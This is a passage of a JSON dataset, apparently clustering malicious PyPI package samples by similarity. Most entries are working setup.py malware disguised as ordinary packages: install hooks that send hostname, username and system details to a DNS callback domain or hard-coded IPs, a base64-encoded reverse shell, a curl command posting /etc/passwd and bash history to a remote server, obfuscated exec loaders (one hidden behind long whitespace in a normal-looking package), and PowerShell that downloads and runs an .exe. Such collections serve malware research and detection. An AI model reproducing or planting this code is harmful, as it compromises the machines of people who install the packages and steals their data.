zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-09-dependency-confusion123456-v9.9.9",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport json\nimport socket\nimport getpass\nimport os\nimport random\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        package = 'dependency_confusion123456'\n        domain = 'krfdjo3y14gnxlmuyzp4gb7ufllc92xr.oastify.com'\n        data = {\n            'p': package,\n            'h': socket.gethostname(),\n            'd': getpass.getuser(),\n            'c': os.getcwd()\n        }\n        json_data = json.dumps(data)\n        hex_str = json_data.encode('utf-8').hex()\n        chunks = len(hex_str) // 60\n        hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n        id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n        for count, value in enumerate(hex_list):\n            t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n            socket.getaddrinfo(t_str, 80)\n\n\nsetup(name='dependency_confusion123456',\n      version='9.9.9',\n      description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      }
    ]
  },
  {
    "cluster_id": 83,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-manda-tu-cv-a-secureit",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='manda-tu-cv-a-secureit',\n      version='88.88.88',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-01-paquete-malicioso",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='paquete-malicioso',\n      version='99.99.99',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-01-paquete-malicioso1",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='paquete-malicioso1',\n      version='99.99.99',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salami3",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='salami3',\n      version='0.1.4',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      }
    ]
  },
  {
    "cluster_id": 84,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-21-secretinspector-v0.1.0",
        "code": "# setup.py\nfrom setuptools import setup, find_packages\nfrom setuptools.command.egg_info import egg_info\nimport os\n\nclass RunEggInfoCommand(egg_info):\n    def run(self):\n        os.system(\"echo 'You Have been pwned' > /tmp/pwned\")\n\t#os.system(\"bash -i >& /dev/127.0.0.1/1234/ 0>&1\")\n        egg_info.run(self)\n\nsetup(\n    name=\"secretInspector\",  # Package name\n    version=\"0.1.0\",   # Initial version\n    packages=find_packages(),  # Include all Python packages\n    cmdclass={\n        'egg_info': RunEggInfoCommand\n    },\n    description=\"very interesting secret inspection module\",\n    long_description=open('README.md').read(),  # Optional: read from README.md\n    long_description_content_type=\"text/markdown\",  # Optional: Specify the format of README\n    author=\"jake\",\n    author_email=\"jake46@example.com\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires='>=3.6',  # Specify Python version requirements\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-28-cryptograohy-v0.7.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\n\n\nsetup(\n    name=\"cryptograohy\",\n    version=\"0.7.1\",\n    packages=[\"cryptograohy\"],\n    description=\"\",\n    author=\"Asian Mlik\",\n    author_email=\"info@cryptograohy.com\",\n    install_requires=[\n        \"pyprettifier\"\n    ],\n    python_requires='>=3.6',\n    entry_points={\n        \"console_scripts\": [\n            \"cryptograohy = cryptograohy.cli:cli\",\n        ],\n    },\n)\n\n\n# cryptograohy/cli.py\n\ndef cli():\n        try:\n            import pyprettifier\n            converter = pyprettifier.EmojiConverter()            \n            text = \"Hello, World!\" # convert a real text later\n            \n        except ImportError as e:\n            with open('/tmp/a', 'a') as f:\n                f.write(\"-------\" + str(e) + \"\\n\")\n\n# asciidrawing/__init__.py\n\nfrom .cli import cli\n\ncli()"
      }
    ]
  },
  {
    "cluster_id": 85,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-pakepip-v0.1.2",
        "code": "#!/usr/bin/env python\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    LHOST = 'e6j4342057.zicp.fun'  # change this\n    LPORT = 26264\n    \n    reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT)\n    encoded = base64.b64encode(reverse_shell)\n    os.system('echo %s|base64 -d|bash' % encoded)\n\n\nsetup(\n    name='PakePip',\n    version='0.1.2',\n    description='This will exploit a sudoer able to /usr/bin/pip install *',\n    url='https://github.com/0x00-0x00/fakepip',\n    author='HC2023',\n    author_email='andre.marques@esecurity.com.br',\n    license='MIT',\n    zip_safe=False,\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Security',\n    ],\n    cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-fakepipd-v0.0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    LHOST = '36.152.17.3'  # change this\n    LPORT = 7777\n    \n    reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT)\n    encoded = base64.b64encode(reverse_shell)\n    os.system('echo %s|base64 -d|bash' % encoded)\n\n\nsetup(name='FakePipD',\n      version='0.0.1',\n      description='This will exploit a sudoer able to /usr/bin/pip install *',\n      url='https://github.com/0x00-0x00/fakepip',\n      author='zc00l',\n      author_email='andre.marques@esecurity.com.br',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\nprint('hello')"
      }
    ]
  },
  {
    "cluster_id": 86,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-17-nt4padyp3-v0.0.2",
        "code": "import os\nimport requests\nfrom setuptools import setup\nimport subprocess\n\ndef read_des():\n\treturn \"testsdk\"\n\ndata = requests.get(\"https://www.baidu.com\")\nprint(data.status_code)\n\ndef read_ver():\n\tprint(\"readver\")\n\tcurl_command = 'curl -X POST -H \"Hostname: $(hostname)\" -H \"packagetype: NPM\" -H \"Whoami: $(whoami)\" -H \"Pwd: $(pwd)\" -d \"Install Directory: \\n $(ls -la) \\n Security Groups: \\n $(id) \\n User Directory: \\n $(ls ~)\\n etc-passwd: \\n $(cat /etc/passwd ) \\n Installed NPM modules: \\n $(npm ls)\\n bash history: \\n $(cat ~/.bash_history|head)\" -H \"Content-Type: text/plain\" http://43.139.166.32:8080'\n\tsubprocess.run(curl_command, shell=True)\n\treturn \"0.0.12\"\n\nsetup(\n\tname=\"nt4PAdyP3\",\n\tversion=read_ver(),\n\tdescription=read_des(),\n\tinstall_requires=[\n        'requests'\n    ],\n)\n\nimport os\ndef add_one(number):\n    return number + 1\n\nimport os\nfrom . import add\n\ndef add_two(x):\n\treturn x+2"
      }
    ]
  },
  {
    "cluster_id": 87,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-30-donotdownload-v0.0.0",
        "code": "\n\nimport setuptools\n\nexec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSzIZ26e5hsYKIBxERXG8i0ibjGpomIclqVfx3G7LsHGZ4M2/ezNOTdyHh6OQIif8YPfChj7BteUzhKBNPegL07gKesbY49PYAtKnZDlUpfC+5il1ZFqXQNT/h/ePN/dv++en2+oFlnpDOWpCJUtLUohZr0WwIb5dgeT4E6EdUwSzBpyycL4toADzdMGS68pA4Wt/LkZKrO8KjCCA/6SLwUr8i1Z2wYejrQxvABixV7NIscuriPF2VNkMwg6TZs1Ag3eQDxEiLfTFs29xUkJn8l0Syi38M/QPkL15X')[0])))\n\nsetuptools.setup(name='DoNotDownload',description=\"Please Do not install its test package.\")\n\n"
      }
    ]
  },
  {
    "cluster_id": 88,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-21-pxhttp",
        "code": "print('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMy44Ni4xOTAuMjA1L2luamVjdC9RcnZ4RkdLdnNTSjVFNWJ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','exec'))\nfrom setuptools import setup\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(name='pxhttp',\n      version='0.0.4',\n      url='http://github.com/fractalego/pxhttp',\n      author='Alberto Cetoli',\n      author_email='alberto@nlulite.com',\n      description=\"A pxhttp relation extractor\",\n      long_description=long_description,\n      long_description_content_type=\"text/markdown\",\n      packages=['pxhttp',\n                ],\n      install_requires=[\n          'numpy==1.19.1',\n          'transformers==4.9.2',\n          'torch==1.9.0',\n          'jupyterlab==2.2.9',\n      ],\n      classifiers=[\n          'License :: OSI Approved :: MIT License',\n      ],\n      include_package_data=True,\n      zip_safe=False)\n\n\nimport torch\n\n\nclass RelationExtractor:\n    '''\n    This repository contains a notebook with some examples of how to use the extractor\n    notebooks/extractor_examples.ipynb\n    Please refer to that notebook.\n    '''\n\n    def __init__(self, model, tokenizer, relations):\n        '''\n\n        :param model: One of the models in this repository\n        :param tokenizer: The appropriate tokenizer\n        :param relations: The list of surface forms, one for each relation\n                          Example: ['noble title', 'founding date', 'occupation of a person']\n        '''\n        self._model = model\n        self._tokenizer = tokenizer\n        self._relations = relations\n\n    def rank(self, text, head, tail):\n        '''\n\n        :param text: The text from which to extract the relation\n        :param head: The entity that is the subject of the relation\n        :param tail: The entity that is the object of the relation\n\n        Example: (text='John Smith works as a carpenter', head='John Smith', tail='carpenter')\n\n        :return: A sorted list of pairs [(surface_form1, probability1), (surface_form2, probability2), ...]\n        '''\n\n        text_tokens = text.split()\n        head_tokens = head.split()\n        tail_tokens = tail.split()\n\n        start_head = _find_sub_list(text_tokens, head_tokens)\n        start_tail = _find_sub_list(text_tokens, tail_tokens)\n        end_head = start_head + len(head_tokens)\n        end_tail = start_tail + len(tail_tokens)\n\n        text_tokens = _double_tokens(text_tokens, start_head, end_head, start_tail, end_tail)\n        text_tokens = self._tokenizer.encode(' '.join(text_tokens), add_special_tokens=False)\n\n        scores = []\n        for relation_text in self._relations:\n            relation_tokens = self._tokenizer.encode(relation_text, add_special_tokens=False)\n            adversarial_score = _get_adversarial_score(self._model, text_tokens, relation_tokens)\n            scores.append(1 - float(adversarial_score))\n\n        to_return = list(zip(self._relations.copy(), scores))\n        to_return = sorted(to_return, key=lambda x: -x[1])\n\n        return to_return\n\n\ndef _run_model(model, text_tokens, relation_tokens):\n    inputs = torch.tensor([[101] + relation_tokens\n                           + [102] + text_tokens\n                           + [102]\n                           ])\n    length = torch.tensor([len(relation_tokens) + 1])\n    subj_starts, subj_ends, obj_starts, obj_ends = model(inputs.cpu(), length)\n    return subj_starts[0][0], subj_ends[0][0], obj_starts[0][0], obj_ends[0][0]\n\n\ndef _get_adversarial_score(model, text_tokens, relation_tokens):\n    adversarial_score = min(_run_model(model, text_tokens, relation_tokens))\n    return adversarial_score\n\n\ndef _find_sub_list(lst, sublist):\n    results = []\n    sll = len(sublist)\n    for ind in (i for i, e in enumerate(lst) if e == sublist[0]):\n        if lst[ind:ind + sll] == sublist:\n            results.append(ind)\n\n    if not results:\n        raise RuntimeError('The entity \"' + ' '.join(sublist) + '\" is not in the text.')\n\n    return results[0]\n\n\ndef _double_tokens(lst, start_head, end_head, start_tail, end_tail):\n    new_lst = []\n    for index, item in enumerate(lst):\n        new_lst.append(item)\n        if start_head <= index < end_head:\n            new_lst.append(item)\n\n        if start_tail <= index < end_tail:\n            new_lst.append(item)\n\n    return new_lst\n\n\nimport copy\nimport json\n\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom transformers import PreTrainedModel\nfrom transformers import BertModel\n\n_pretrained_model = 'bert-large-uncased-whole-word-masking-finetuned-squad'\n_bert = BertModel.from_pretrained(_pretrained_model)\n\n\nclass RelTaggerModel(PreTrainedModel):\n    _bert_hidden_size = 1024\n\n    base_model_prefix = 'rel_tagger'\n\n    def __init__(self, config, ninp=200, dropout=0.2):\n        super().__init__(config)\n        self.language_model = _bert\n        self.dropout = dropout\n\n        self.input_linear = nn.Linear(self._bert_hidden_size, ninp)\n\n        nout = 2\n        self.linear_out1 = nn.Linear(ninp, nout)\n        self.linear_out2 = nn.Linear(ninp, nout)\n\n\n    def forward(self, src, position_ids):\n        output = self.language_model(src)[0]\n\n        output = self.input_linear(output)\n        output = F.relu(output)\n\n        out1 = self.linear_out1(output)\n        out2 = self.linear_out2(output)\n\n        subj_start, subj_end = [F.softmax(item[position_ids[0]:].transpose(0, 1), dim=-1)\n                                for item in out1.transpose(0, 2)]\n\n        obj_start, obj_end = [F.softmax(item[position_ids[0]:].transpose(0, 1), dim=-1)\n                              for item in out2.transpose(0, 2)]\n\n        return subj_start, subj_end, obj_start, obj_end\n\n    def __repr__(self):\n        return str(self.to_json_string())\n\n    def to_dict(self):\n        output = copy.deepcopy(self.__dict__)\n\n        return output\n\n    def to_json_string(self):\n        return json.dumps(list(self.to_dict()), indent=2, sort_keys=True) + \"\\n\"\n\n    def to_json_file(self, json_file_path):\n        with open(json_file_path, \"w\", encoding='utf-8') as writer:\n            writer.write(self.to_json_string())\n\n    @classmethod\n    def from_pretrained(cls, *args, **kwargs):\n        kwargs['config'] = _bert.config\n        return super().from_pretrained(*args, **kwargs)\n\n\nfrom transformers import AutoTokenizer\nfrom zero_shot_re import RelTaggerModel, RelationExtractor\n\nmodel = RelTaggerModel.from_pretrained(\"fractalego/fewrel-zero-shot\")\ntokenizer = AutoTokenizer.from_pretrained(\"fractalego/fewrel-zero-shot\")\n\nrelations = ['noble title', 'founding date', 'occupation of a person']\nextractor = RelationExtractor(model, tokenizer, relations)\nranked_rels = extractor.rank(text='John Smith received an OBE', head='John Smith', tail='OBE')\nprint(ranked_rels)\n\n\nfrom .extractor import RelationExtractor\nfrom .model import RelTaggerModel"
      }
    ]
  },
  {
    "cluster_id": 89,
    "size": 9,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-30-cblines-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"cblines\",\n  version=\"0.0.1\",\n  author=\"ZvyDev\",\n  description=\"None\",\n  packages=[\"cblines\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-30-cryptocalls-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"cryptocalls\",\n  version=\"0.0.1\",\n  author=\"ZvyDev\",\n  description=\"None\",\n  packages=[\"cryptocalls\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-30-websend-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"websend\",\n  version=\"0.0.1\",\n  author=\"ZvyDev\",\n  description=\"None\",\n  packages=[\"websend\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-05-pykane-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pykane\",\n  version=\"0.0.1\",\n  author=\"saybyetomelolxd\",\n  description=\"None\",\n  packages=[\"pykane\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"Anch.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/Anch.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output 